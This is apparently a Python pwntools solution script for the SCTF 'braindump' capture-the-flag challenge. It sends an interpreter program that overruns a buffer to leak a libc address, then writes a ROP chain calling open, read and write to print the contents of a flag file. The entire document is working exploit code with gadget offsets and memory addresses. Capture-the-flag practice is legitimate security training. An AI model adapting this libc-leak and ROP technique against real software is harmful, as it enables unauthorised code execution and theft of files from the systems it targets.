from pwn import *

r = remote("pwn.ctf.rocks", 31337)
# r = process("./braindump_a4538a4da335e7b2e84d18c3dfe1832e")
l = ELF("./libc.so.6_eea5f41864be6e7b95da2f33f3dec47f")

payload = '!>' * 0x208
payload += '!:!>' * 8	# leak libc_base
payload += '!<' * 8
payload += '!.!>' * ((8 * 17))	# write rop chain
payload += './flag\x00'

# raw_input("$ ")
r.sendlineafter("code:", payload)

libc_base = u64(r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1)) - l.functions['__libc_start_main'].address - 0xf0
libc_open = libc_base + l.functions['open'].address
libc_read = libc_base + l.functions['read'].address
libc_write = libc_base + l.functions['write'].address
pop_rdi = libc_base + 0x21102	# pop rdi ; ret
pop_rdx_rsi = libc_base + 0x1144d9	# pop rdx ; pop rsi ; ret
flag = 0x602740
data = 0x602088
log.info("libc_base : " + hex(libc_base))

payload2 = p64(pop_rdi)
payload2 += p64(flag)
payload2 += p64(pop_rdx_rsi + 1)	# pop rsi
payload2 += p64(0)
payload2 += p64(libc_open)
payload2 += p64(pop_rdi)
payload2 += p64(3)
payload2 += p64(pop_rdx_rsi)
payload2 += p64(0x50)
payload2 += p64(data)
payload2 += p64(libc_read)
payload2 += p64(pop_rdi)
payload2 += p64(1)
payload2 += p64(pop_rdx_rsi)
payload2 += p64(0x50)
payload2 += p64(data)
payload2 += p64(libc_write)

r.send(payload2)

print "SCTF{" + r.recvall().split("SCTF{")[1].split("}")[0] + "}"
